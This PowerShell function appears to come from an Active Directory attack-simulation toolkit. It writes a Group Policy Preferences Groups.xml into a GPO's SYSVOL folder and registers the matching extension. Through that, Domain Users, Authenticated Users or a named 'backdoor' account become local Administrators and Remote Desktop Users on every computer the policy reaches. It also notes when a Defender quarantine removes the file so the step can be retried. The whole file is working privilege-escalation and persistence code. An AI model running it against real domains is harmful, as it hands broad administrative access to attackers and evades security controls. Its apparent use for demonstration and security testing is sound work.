<#
.SYNOPSIS
Edits the selected GPO to add a selected security principal to built-in local groups.

.FUNCTIONALITY
Demonstrates excessive local access granted through Group Policy Preferences.
Updates the selected GPO to add the selected principal to the local
Administrators and Remote Desktop Users groups on computers where the GPO applies.
#>
function Add-GPOMemberToBuiltinGroups {

    ################################################################################
    #####                                                                      ##### 
    #####      Add or Update members in Built-in Admin Groups                  #####                                 
    #####                                                                      #####
    ################################################################################

    Param(
        [string] $domainDNS,
        [string] $server,
        [string] $ID, 
        [String] $name
    )

    $Info = Measure-FunctionRuntime -Begin

    Show-CurrentPhase -Phase "ASP12_GPT.html"

    If (-not $SkipClearHost) { Clear-Host }

    Write-AS2GoOutput -Type Header -Message "Add or Update Built-in Admin Group Members"
    Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)
    Write-AS2GoOutput -Type TextMaker -Message "Affected GPO" -TM "'$name' {$ID}"

    $LatestBackdoorUser = Get-ASConfig -Setting "LastBDUser"

    $isValid = (
        $LatestBackdoorUser -match '(?:^|,)\s*CN=[^,]+' -and
        $LatestBackdoorUser -match '(?:^|,)\s*OU=[^,]+' -and
        $LatestBackdoorUser -match '(?:^|,)\s*DC=[^,]+'
    )


    if ($isValid) {
        $cn = Convert-FromDNToCN -DistinguishedName $LatestBackdoorUser
        $helpBDU = "Use a existing backdoor $cn"
    }
    else {
        $helpBDU = ""
    }


    $title = "Configure Local Group Membership"
    $message = "Select the security principal to add to both local groups."

    If ($UnAttended) {
        $answer = "DU"
    }
    else {

        $Options = @(
            [pscustomobject] @{ 
                Label = "&Authenticated Users"; 
                Help  = "Use NT AUTHORITY\Authenticated Users (SID: S-1-5-11)."; 
                Value = "AU" 
            },
            [pscustomobject] @{ 
                Label = "&Domain Users"; 
                Help  = "Use the Domain Users group from the selected GPO's domain."; 
                Value = "DU" 
            },
            [pscustomobject] @{ 
                Label = "&Backdoor Users"; 
                Help  = $helpBDU; 
                Value = "BU" 
            },
            [pscustomobject] @{ 
                Label = "Specific &User or Group"; 
                Help  = "Select a specific user or group."; 
                Value = "SUoG" 
            },
            [pscustomobject] @{ 
                Label = "S&kip";
                Help  = "Skip this configuration step without making changes."; 
                Value = $Script:No 
            }
        )

        $answer = Show-DecisionPrompt -Title $title -Message $message -Options $Options -Default 0
    }

    If ($answer -eq $Script:No) {
        Write-Log -Message "    >> Skipped!"
        Measure-FunctionRuntime -End -Details $Info
        return
    }

    write-host
    #define the new trustee based on the selected option
    Switch ($answer) {

        "AU" {
            $newtrustee = "NT AUTHORITY\Authenticated Users"
            $trusteeSID = "S-1-5-11"
        }
        "DU" {
            $temp = $Script:AllDomainsDetails | Where-Object { $_.DomainFQDN -match $domainDNS } | Select-Object DomainSID, NetBIOSName
            $domainusersName = (Get-ADGroup -Filter * -Properties name -Server $domainDNS | Where-Object { ($_.SID -like "*-513") }).name
            $newtrustee = $temp.NetBIOSName + "\" + $domainusersName
            $trusteeSID = $temp.DomainSID + "-513"
        }
        "BU" {
            $LatestBackdoorUser = Get-ASConfig -Setting "LastBDUser"
            If ([string]::IsNullOrWhiteSpace($LatestBackdoorUser)) {
                Write-AS2GoOutput -Type Warning -Message "No backdoor account configured. Please set the value for 'LastBDUser' in the configuration file."
                Measure-FunctionRuntime -End -Details $Info
                return
            }
            $BDDomain = Get-BestDomainController -domain $LatestBackdoorUser
            try {
                $AdditionalUser = Get-ADUser -Identity $LatestBackdoorUser -Server $BDDomain -ErrorAction Stop
            }
            catch {
                Write-AS2GoOutput -Type Warning -Message "Backdoor account '$LatestBackdoorUser' could not be resolved."
                Measure-FunctionRuntime -End -Details $Info
                return
            }
            $CN = Convert-FromDNToCN -DistinguishedName $AdditionalUser.DistinguishedName
            $BDDomainDNS = $CN.Split('/')[0]
            $temp = $Script:AllDomainsDetails | Where-Object { $_.DomainFQDN -match $BDDomainDNS } | Select-Object NetBIOSName
            $newtrustee = $temp.NetBIOSName + "\" + $AdditionalUser.SamAccountName
            $trusteeSID = $AdditionalUser.SID
        }
        "SUoG" {
            $selectedDN = Select-ADObject -Title $title -IncludeUsers -IncludeGroups -MarkTier0 -BlockOUSelection
            If ([string]::IsNullOrWhiteSpace($selectedDN)) {
                Write-AS2GoOutput -Type Warning -Message "No user or group selected."
                Measure-FunctionRuntime -End -Details $Info
                return
            }
            $selectedServer = Get-BestDomainController -domain $selectedDN
            try {
                $selectedObject = Get-ADObject -Identity $selectedDN -Properties objectSid, sAMAccountName, name -Server $selectedServer -ErrorAction Stop
            }
            catch {
                Write-AS2GoOutput -Type Warning -Message "Selected principal '$selectedDN' could not be resolved."
                Measure-FunctionRuntime -End -Details $Info
                return
            }
            $domainDN = if ($selectedDN -match '(?i)(^|,)(DC=[^,]+(?:,DC=[^,]+)*)$') { $Matches[2] } else { $null }
            $temp = $Script:AllDomainsDetails | Where-Object { $_.DomainDN -match "^$domainDN" } | Select-Object DomainFQDN, NetBIOSName
            $principalDomain = If ($temp) { $temp.NetBIOSName } else { ($domainDN -replace 'DC=', '') -replace ',', '.' }
            $principalName = If ($selectedObject.sAMAccountName) { $selectedObject.sAMAccountName } else { $selectedObject.Name }
            $newtrustee = $principalDomain + "\" + $principalName
            $trusteeSID = $selectedObject.objectSid.Value
        }
        default {
            Write-Log -Message "    >> Unexpected selection: $answer"
            Measure-FunctionRuntime -End -Details $Info
            return
        }
    }

    Write-AS2GoOutput -Type TextMaker -Message "Selected trustee:" -TM "$newtrustee ($trusteeSID)"

    [bool]$blocaladmins = $false
    [bool]$rdu = $false
    $xml = New-Object XML

    #define the target file
    $xmlFilePath = "\\$server\SYSVOL\$domainDNS\Policies\{$ID}\Machine\Preferences\Groups\Groups.xml"

    $GroupLocalAdmin = "Administrators (built-in)"
    $GroupRemoteDesktopUser = "Remote Desktop Users (built-in)"

    #first check for file .\Machine\Preferences\Groups\Groups.xml
    #and if needed create the file with a corresponding trustee
    If (!(Test-Path $xmlFilePath)) {

        New-Item -Name "Machine" -ItemType Directory -Path "\\$server\SYSVOL\$domainDNS\Policies\{$ID}" -ErrorAction Ignore | Out-Null
        New-Item -Name "Preferences" -ItemType Directory -Path "\\$server\SYSVOL\$domainDNS\Policies\{$ID}\Machine" -ErrorAction Ignore | Out-Null
        New-Item -Name "Groups" -ItemType Directory -Path "\\$server\SYSVOL\$domainDNS\Policies\{$ID}\Machine\Preferences" -ErrorAction Ignore | Out-Null

        Write-Log -Message "    >> created path: \\$server\SYSVOL\$domainDNS\Policies\{$ID}\Machine\Preferences\Groups\"

        # create core element 'Groups'
        $groupsElement = $xml.CreateElement("Groups")
        $groupsElement.SetAttribute("clsid", "{3125E937-EB16-4b4c-9934-544FC6D24D26}")
        $xml.AppendChild($groupsElement) | Out-Host
        $xml.Save($xmlFilePath)

        Start-Sleep 1
        Add-GroupElementToFileGroupsXml -xmlFilePath $xmlFilePath -GroupName $GroupLocalAdmin -GroupSID "S-1-5-32-544"
    }
    else {
        Write-Log -Message "    >> found file: $xmlFilePath"
    }

    # Groups.xml can be removed after creation (e.g. by security controls on the domain controller).
    If (!(Test-Path $xmlFilePath)) {
        Write-AS2GoOutput -Type Warning -Message "Groups.xml is no longer present under SYSVOL - possibly removed by a security control on the DC. Aborting this step."
        Measure-FunctionRuntime -End -Details $Info
        return
    }

    [xml]$xml = Get-Content $xmlFilePath

    # check if Administrators (built-in) exists
    $result = $xml.SelectSingleNode("//Group[@name='$GroupLocalAdmin']")
    if ($null -eq $result) { $blocaladmins = $false } else { $blocaladmins = $true }
    Write-Log -Message "    >> $GroupLocalAdmin exists: $blocaladmins"

    # check if Remote Desktop Users (built-in) exists
    $result = $xml.SelectSingleNode("//Group[@name='$GroupRemoteDesktopUser']")
    if ($null -eq $result) { $rdu = $false } else { $rdu = $true }
    Write-Log -Message "    >> $GroupRemoteDesktopUser exists: $rdu"

    If ($blocaladmins -eq $false) {
        Add-GroupElementToFileGroupsXml -xmlFilePath $xmlFilePath -GroupName $GroupLocalAdmin -GroupSID "S-1-5-32-544"
    }

    If ($rdu -eq $false) {
        Add-GroupElementToFileGroupsXml -xmlFilePath $xmlFilePath -GroupName $GroupRemoteDesktopUser -GroupSID "S-1-5-32-555"
    }

    write-host
    Add-TrusteeToFileGroupsXml -xmlFilePath $xmlFilePath -LocalGroup $GroupLocalAdmin -Trustee $newtrustee -SID $trusteeSID

    # Groups.xml can be removed between the two calls (e.g. by security controls on the domain controller).
    If (Test-Path $xmlFilePath) {
        Add-TrusteeToFileGroupsXml -xmlFilePath $xmlFilePath -LocalGroup $GroupRemoteDesktopUser -Trustee $newtrustee -SID $trusteeSID

        # Groups.xml can also vanish after the last write; the calling menu clears the console, so this must be logged.
        If (Test-Path $xmlFilePath) {
            Write-Log -Message "    >> Groups.xml still present after both trustee writes."
        }
        else {
            Write-AS2GoOutput -Type Warning -Message "Groups.xml disappeared after modifying $GroupRemoteDesktopUser. Check for security controls on the DC (e.g. Defender quarantine) and rerun this step."
        }
    }
    else {
        Write-AS2GoOutput -Type Warning -Message "Groups.xml disappeared after modifying $GroupLocalAdmin - $GroupRemoteDesktopUser was not updated. Check for security controls on the DC and rerun this step."
    }

    # Register the GPT extension only after all SYSVOL writes finished, mirroring Add-GPOScheduleTask:
    # an early AD write (gPCMachineExtensionNames) can trigger DC-side policy processing while this step
    # is still writing Groups.xml, which previously coincided with the file disappearing mid-flow.
    Set-GPCMachineExtensionNames -GPOGUID $ID -CSEGUID $Script:CSEGUIDLocalUaG -TOOLGUID $Script:ToolGUIDLocalUaG -Server $domainDNS

    if (-not $UnAttended) { Pause }

    Measure-FunctionRuntime -End -Details $Info
}
